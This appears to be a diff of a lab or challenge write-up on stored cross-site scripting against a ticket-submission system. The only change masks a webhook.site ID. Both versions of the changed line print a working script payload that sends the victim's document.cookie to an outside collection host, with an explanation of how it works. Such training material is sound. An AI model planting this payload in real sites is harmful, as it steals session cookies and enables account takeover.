@@ -68,6 +68,6 @@ To really be able to check this and make sure that it's not just storing the mes
 
 The challenge exercise involves a ticket submitting system that is vulnerable to attack (stored I believe) and it grabs an admin cookie without letting the user know.
 
-You can use a site called webhook.site in order to give your payload something to point at.  Inserting `<script>var i=new Image; i.src="https://webhook.site/4432caa9-6a78-4410-aa7e-b2b43a16441c/?"+document.cookie;</script>` with the webhook.site address, along with the `/?` to make the cookie a parameter and then append (`+`) the cookie with `document.cookie`
+You can use a site called webhook.site in order to give your payload something to point at.  Inserting `<script>var i=new Image; i.src="https://webhook.site/44******-****-****-****-********441c/?"+document.cookie;</script>` with the webhook.site address, along with the `/?` to make the cookie a parameter and then append (`+`) the cookie with `document.cookie`
 
 When testing this in real world, you won't use sites like webhook.site.  You can spin up a webserver to catch traffic in a variety of ways that don't involve a public website that might collect user data.
